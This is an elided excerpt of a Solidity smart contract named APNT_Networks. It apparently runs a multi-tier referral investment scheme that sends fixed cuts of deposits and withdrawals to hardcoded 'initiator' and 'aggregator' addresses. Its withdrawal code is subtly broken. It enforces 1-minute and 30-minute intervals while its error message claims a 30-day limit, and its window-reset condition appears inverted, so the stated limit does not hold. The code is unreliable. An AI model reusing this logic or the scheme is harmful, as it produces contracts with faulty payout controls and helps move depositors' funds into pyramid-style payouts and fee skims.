...
contract APNT_Networks {
    ...
    constructor() public {
        ...
        aggregator = 0x43529845eF334F7102d34BC8cDF3cA4666bF81Cb;
    ...
    function deposit(address _referer) public payable{
        ...
        initiator.transfer(msg.value.div(100));
    ...
    function _setReferral(address _addr, address _referral, uint256 _amount) private {
        ...
        if(users[_addr].referral == address(0)) {
            ...
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                ...
                else if(i>0 && i<=4 && users[_referral].referrals_per_level[i]>=5e18){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                else if(i>4 && i<=8 && users[_referral].referrals_per_level[i]>=7e18){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                else if(i>8 && i<=10 && users[_referral].referrals_per_level[i]>=10e18){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                else if(i>10 && i<=12 && users[_referral].referrals_per_level[i]>=15e18){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
                else if(i>12 && i<=14 && users[_referral].referrals_per_level[i]>=20e18){
                    users[_referral].levelIncome[i]+=_amount.mul(referral_bonuses[i].div(100)).div(100);
                }
    ...
    function workingWithdraw(uint256 _amount) public{
        ...
        user.payoutCount++;
        uint256 levelShare = _amount.mul(5).div(100);
    ...
    function nonWorkingWithdraw() public{
        User storage user = users[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 minutes:deposits[msg.sender][0].depositTime;
        require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
        
        if(user.lastNonWokingWithdrawBase + 30 minutes > block.timestamp){
            user.lastNonWokingWithdrawBase = block.timestamp;
            user.nonWorkingPayoutCount = 0;
        }
        require(user.nonWorkingPayoutCount <= 11,"Sorry ! Maximum withdraw limit exceed from 11 times in 30 days.");
        user.nonWorkingPayoutCount++;
        uint8 perc = (user.referrals_per_level[0]>=1000e18)?100:25;
        ...
        msg.sender.transfer(withdrawable.mul(90).div(100));
        aggregator.transfer(withdrawable.mul(7).div(100));
         _distributePSI(msg.sender,withdrawable.mul(3).div(100));
        user.sellCount++;
